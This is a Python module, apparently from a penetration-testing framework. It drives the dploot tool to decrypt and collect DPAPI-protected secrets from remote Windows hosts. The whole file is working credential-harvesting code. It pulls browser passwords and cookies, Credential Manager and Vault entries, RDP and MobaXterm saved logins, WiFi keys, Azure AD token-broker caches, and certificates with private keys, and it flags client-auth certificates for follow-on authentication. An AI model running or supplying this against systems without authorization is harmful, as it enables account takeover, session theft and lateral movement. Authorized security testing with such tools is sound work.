"""DPAPI-protected loot via the dploot CLI (v4): browser passwords/cookies,
Credential Manager, Vaults, certificates, RDCMan (.rdg), WiFi, WAM token broker,
MobaXterm, plus the MACHINE DPAPI stores (need admin on the target).

dploot v4 wants the target with -t and uses --quiet; auth is -u/-p/--hashes/-k.
Per-credential: dploot decrypts a user's blobs with that user's password/hash.
Parsing is tolerant (raw output always saved, so nothing is lost on a miss)."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

KV_RE = re.compile(
    r"^\s*(url|origin|target|targetname|resource|server|servername|service|ssid|"
    r"username|user|login|password|pass|secret|key|cookie)\s*(?:[:=]|-)\s*(.+?)\s*$",
    re.I)
INLINE_RE = re.compile(r"^(?P<url>\S+)\s+-\s+(?P<user>[^:\s]+):(?P<pw>.+)$")


def _flush(host, source, buf) -> List[Secret]:
    user = buf.get("username") or buf.get("user") or buf.get("login") or ""
    pw = (buf.get("password") or buf.get("pass") or buf.get("secret")
          or buf.get("key") or buf.get("cookie") or "")
    tgt = (buf.get("url") or buf.get("origin") or buf.get("target")
           or buf.get("targetname") or buf.get("resource") or buf.get("server")
           or buf.get("servername") or buf.get("service") or buf.get("ssid") or "")
    if not (user or pw):
        return []
    stype = "cookie" if "cookie" in buf else "password"
    return [Secret(host, source, user, pw, Status.DECRYPTED,
                   target=tgt, secret_type=stype)]


class _DplootModule(BaseCollector):
    per_credential = True
    requires = ("dploot",)
    module = ""
    source = ""
    module_extra: List[str] = []

    def collect_with_cred(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("dploot")
        if not bin_:
            return []
        cmd = ([bin_, self.module, "-t", self.host, "--quiet"]
               + cred.dploot_auth_args() + self.module_extra)
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _parse(self, out: str) -> List[Secret]:
        found: List[Secret] = []
        buf: dict = {}
        for line in strip_ansi(out).splitlines():
            if not line.strip():
                if buf:
                    found += _flush(self.host, self.source, buf); buf = {}
                continue
            mi = INLINE_RE.match(line.strip())
            if mi and ("http" in mi.group("url").lower() or "." in mi.group("url")):
                found.append(Secret(self.host, self.source, mi.group("user"),
                                    mi.group("pw"), Status.DECRYPTED,
                                    target=mi.group("url"), secret_type="password"))
                continue
            m = KV_RE.match(line)
            if m:
                key = m.group(1).lower()
                if key in buf:
                    found += _flush(self.host, self.source, buf); buf = {}
                buf[key] = m.group(2)
                continue
            if buf:
                found += _flush(self.host, self.source, buf); buf = {}
        if buf:
            found += _flush(self.host, self.source, buf)
        return self._dedup(found)

    @staticmethod
    def _dedup(items: List[Secret]) -> List[Secret]:
        seen, out = set(), []
        for s in items:
            if s.key() in seen:
                continue
            seen.add(s.key()); out.append(s)
        return out


class BrowserCollector(_DplootModule):
    name = "Browser"; source = "Browser"; module = "browser"
    module_extra = ["--show-cookies"]
    description = "Chrome/Edge/Firefox saved logins + cookies (auto-decrypted)"


class CredManCollector(_DplootModule):
    name = "CredMan"; source = "CredMan"; module = "credentials"
    description = "Windows Credential Manager (incl. scheduled-task creds)"


class VaultsCollector(_DplootModule):
    name = "Vaults"; source = "Vault"; module = "vaults"
    description = "Windows Vaults"


class RdgCollector(_DplootModule):
    name = "RDCMan"; source = "RDCMan"; module = "rdg"
    description = "RDCMan .rdg saved RDP credentials"


class WifiCollector(_DplootModule):
    name = "WiFi"; source = "WiFi"; module = "wifi"
    description = "WLAN profile PSK / 802.1X"


class WamCollector(_DplootModule):
    name = "WAM"; source = "WAM"; module = "wam"
    description = "Web Account Manager / token broker cache (Azure AD SSO)"


class MobaXtermCollector(_DplootModule):
    name = "MobaXterm"; source = "MobaXterm"; module = "mobaxterm"
    description = "MobaXterm saved sessions / passwords"


class CertificatesCollector(_DplootModule):
    name = "Certs"; source = "Cert"; module = "certificates"
    description = "User certificates + private keys (client-auth = ADCS/PKINIT)"

    def _parse(self, out: str) -> List[Secret]:
        out = strip_ansi(out)
        found: List[Secret] = []
        for line in out.splitlines():
            low = line.lower()
            if ("written" in low or "saved" in low) and (".pfx" in low or ".pem" in low):
                path = line.split()[-1]
                clientauth = "client authentication" in out.lower()
                found.append(Secret(self.host, "Cert", "", path,
                                    Status.DECRYPTED, secret_type="pfx",
                                    notes="client-auth cert -> certipy auth"
                                          if clientauth else "certificate + key"))
        return self._dedup(found)


class MachineCredsCollector(_DplootModule):
    name = "MachineCred"; source = "MachineCred"; module = "machinecredentials"
    description = "Machine Credential Manager (needs admin)"


class MachineVaultsCollector(_DplootModule):
    name = "MachineVault"; source = "MachineVault"; module = "machinevaults"
    description = "Machine Vaults (needs admin)"


class MachineCertsCollector(CertificatesCollector):
    name = "MachineCert"; source = "MachineCert"; module = "machinecertificates"
    description = "Machine certificates + private keys (needs admin)"
